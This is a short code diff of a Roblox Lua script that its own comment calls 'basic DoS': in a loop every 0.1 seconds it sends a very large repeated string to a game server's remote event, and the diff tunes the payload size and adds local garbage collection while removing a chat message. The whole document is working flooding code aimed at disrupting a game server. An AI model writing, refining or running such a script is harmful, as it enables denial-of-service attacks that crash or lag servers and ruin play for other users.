@@ -3,15 +3,26 @@
 -- this script is just basic DoS
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TextChatService = game:GetService("TextChatService")
-local SChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+
 local Remote = ReplicatedStorage.DataEvents.DataRemoteEvent
 
+-- Configuration
 local INTERVAL = 0.1
+local REPETITIONS = 10000
 local ENABLED = true
 
-SChannel:SendAsync("LONG LIVE THE KING!")
+local BASE_STRING = "SHUSHUHSUHSUHSUSHSGSUSUSHHDUHSUSYSGSUUEHG0x99"
+
 while ENABLED do
-    Remote:FireServer(string.rep("SHUSHUHSUHSUHSUSHSGSUSUSHHDUHSUSYSGSUUEHG0x99", 1000090))
+    local Payload = string.rep(BASE_STRING, REPETITIONS)
+
+    Remote:FireServer(Payload)
+
+    -- Release the local reference
+    Payload = nil
+
+    -- Request garbage collection
+    collectgarbage("collect")
+
     task.wait(INTERVAL)
 end
